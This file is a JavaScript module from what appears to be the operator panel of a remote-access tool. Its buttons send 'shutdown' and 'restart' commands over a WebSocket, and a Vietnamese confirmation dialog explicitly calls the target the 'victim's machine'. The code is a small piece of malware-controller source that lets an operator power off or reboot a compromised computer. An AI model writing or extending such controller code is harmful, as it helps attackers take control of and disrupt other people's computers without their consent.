export class PowerManager {
    constructor(ws, logger) {
        this.ws = ws;
        this.logger = logger;
        this.btnShutdown = document.getElementById('btn-shutdown');
        this.btnRestart = document.getElementById('btn-restart');

        this.init();
    }

    init() {
        if (this.btnShutdown) {
            this.btnShutdown.addEventListener('click', () => {
                this.confirmAction('shutdown');
            });
        }

        if (this.btnRestart) {
            this.btnRestart.addEventListener('click', () => {
                this.confirmAction('restart');
            });
        }
    }

    confirmAction(action) {
        const msg = action === 'shutdown' ? 'Tắt máy' : 'Khởi động lại';
        if (confirm(`⚠️ CẢNH BÁO: Bạn có chắc chắn muốn ${msg} máy nạn nhân không?`)) {
            this.sendCommand(action);
        }
    }

    sendCommand(action) {
        this.ws.send(action);
        this.logger.log(`🔌 Đã gửi lệnh: ${action.toUpperCase()}`);
    }
}